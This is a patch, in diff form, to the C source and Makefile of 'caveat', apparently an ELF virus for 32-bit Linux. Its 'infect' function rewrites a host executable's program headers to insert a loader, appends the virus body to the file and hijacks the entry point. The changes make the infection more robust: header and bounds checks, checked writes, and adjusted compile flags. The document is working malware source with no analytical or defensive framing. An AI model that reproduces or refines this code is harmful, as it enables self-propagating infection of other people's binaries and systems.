@@ -1,0 +1,118 @@
+diff -ru caveat.orig/caveat.c caveat/caveat.c
+--- caveat.orig/caveat.c	2008-02-27 16:10:30.000000000 +0200
++++ caveat/caveat.c	2009-08-26 14:25:14.000000000 +0300
+@@ -48,13 +48,13 @@
+ static void infect(char *filename, char *self)
+ {
+ 	char loader[60];
+-	int h, l, i, ok, size;
++	int h, l, i, size;
+ 	uint8_t *m;
+-	uint32_t old_entry, off, base;
++	uint32_t new_entry, off, base;
+ 	Elf32_Ehdr *ehdr;
+ 	Elf32_Phdr *phdr;
+ 	
+-	ok = base = 0;	
++	base = 0;	
+ 	*(unsigned int*)(loader + 0x00) = 0x65786860;
+ 	*(unsigned int*)(loader + 0x04) = 0x6c680000;
+ 	*(unsigned int*)(loader + 0x08) = 0x68652f66;
+@@ -80,40 +80,47 @@
+ 		return;
+ 	if ((l = lseek(h, 0, 2)) < 0)
+ 		goto error1;
+-	m = (char*)mmap(NULL, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
++	m = (uint8_t*)mmap(NULL, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
+ 	if ((uint32_t)m > 0xfffff000)
+ 		goto error1;
+ 	
+ 	ehdr = (Elf32_Ehdr*)m;
+ 	phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
+-	if (*(uint32_t*)ehdr->e_ident != 0x464c457f ||
++	if (	*(uint32_t*)ehdr->e_ident != 0x464c457f ||
++		*(uint16_t*)(m + 4) != 0x0101 ||
+ 		ehdr->e_type != ET_EXEC || ehdr->e_machine != EM_386 ||
+-		ehdr->e_version != EV_CURRENT || ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE) {
++		ehdr->e_version != EV_CURRENT ||
++		(ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE && ehdr->e_ident[EI_OSABI] != ELFOSABI_LINUX) ||
++		(ehdr->e_phoff + ehdr->e_phnum * sizeof(Elf32_Phdr)) > l ||
++		/* this would be suspicious to have so much segments, right? */
++		ehdr->e_phnum > 16) {
+ error2:		munmap(m, l);
+ error1:		close(h);
+ 		return;
+ 	}
+ 	off = (l + 4095) & 0xfffff000;
+ 	*(uint32_t*)(loader + LOADER_OFF) = off;
+-	old_entry = ehdr->e_entry;
+ #ifdef	PARTS
+ 	/* replace the PT_NOTE (in PHT) and .note.ABI-tag with loader */
+ 	uint32_t note;
++	int note_idx = -1;
+ 	for (i = 0; i < ehdr->e_phnum; i++) {
+ 		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0)
+ 			base = phdr[i].p_vaddr;
+-		if (base && phdr[i].p_type == PT_NOTE) {
+-			note = phdr[i].p_offset;
+-			if (i != ehdr->e_phnum - 1)
+-				memcpy(&phdr[i], &phdr[i + 1], sizeof(Elf32_Phdr) * (ehdr->e_phnum - i - 1));
+-			ehdr->e_phnum--;
+-			*(uint32_t*)(loader + LOADER_JMP) = note - (ehdr->e_phoff + sizeof(Elf32_Phdr) * ehdr->e_phnum + 32);
+-			memcpy(&phdr[ehdr->e_phnum], loader, 32);
+-			memcpy(m + note, loader + 32, 28);
+-			ehdr->e_entry = base + ((char*)&phdr[ehdr->e_phnum] - (char*)m);
+-			ok++;			
+-		}
++		if (phdr[i].p_type == PT_NOTE)
++			note_idx = i;
+ 	}
++	if (base && note_idx != -1) {
++		/* check offset */
++		if ((note = phdr[note_idx].p_offset) + 32 > l)
++			goto error2;
++		if (note_idx != ehdr->e_phnum - 1)
++			memcpy(&phdr[note_idx], &phdr[note_idx + 1], sizeof(Elf32_Phdr) * (ehdr->e_phnum - note_idx - 1));
++		ehdr->e_phnum--;
++		*(uint32_t*)(loader + LOADER_JMP) = note - (ehdr->e_phoff + sizeof(Elf32_Phdr) * ehdr->e_phnum + 32);
++		memcpy(&phdr[ehdr->e_phnum], loader, 32);
++		memcpy(m + note, loader + 32, 28);
++		new_entry = base + ((char*)&phdr[ehdr->e_phnum] - (char*)m);
+ #else
+ 	/* replace PT_PHDR/PT_GNU_STACK/PT_NOTE with loader */
+ 	Elf32_Phdr new_phdr[ehdr->e_phnum];
+@@ -129,16 +136,14 @@
+ 		ehdr->e_phnum = new_phnum;
+ 		memcpy(phdr, new_phdr, new_phnum * sizeof(Elf32_Phdr));
+ 		memcpy(&phdr[new_phnum], loader, sizeof(loader));
+-		ehdr->e_entry = base + ((char*)&phdr[new_phnum] - (char*)m);
+-		ok++;
+-	}
++		new_entry = base + ((char*)&phdr[new_phnum] - (char*)m);
+ #endif
+-	if (ok) {
+-		ftruncate(h, off);
+-		lseek(h, 0, 2);
+-		write(h, self, size);
+-		lseek(h, off + 10, 0);
+-		write(h, &old_entry, 4);
++		if (	ftruncate(h, off) == 0 &&
++			lseek(h, 0, 2) == off &&
++			write(h, self, size) == size &&
++			lseek(h, off + 10, 0) == (off + 10) &&
++			write(h, &ehdr->e_entry, 4) == 4)
++			ehdr->e_entry = new_entry;
+ 	}
+ 	goto error2;
+ }
+diff -ru caveat.orig/Makefile caveat/Makefile
+--- caveat.orig/Makefile	2008-02-27 16:10:50.000000000 +0200
++++ caveat/Makefile	2009-08-26 14:24:22.000000000 +0300
+@@ -1,5 +1,6 @@
+ CC = gcc
+-CFLAGS = -Os -nostdlib -Wall -DPARTS
++CFLAGS = -Os -nostdlib -Wall -fno-unit-at-a-time
++#-DPARTS
+ 
+ all: caveat test
+ 
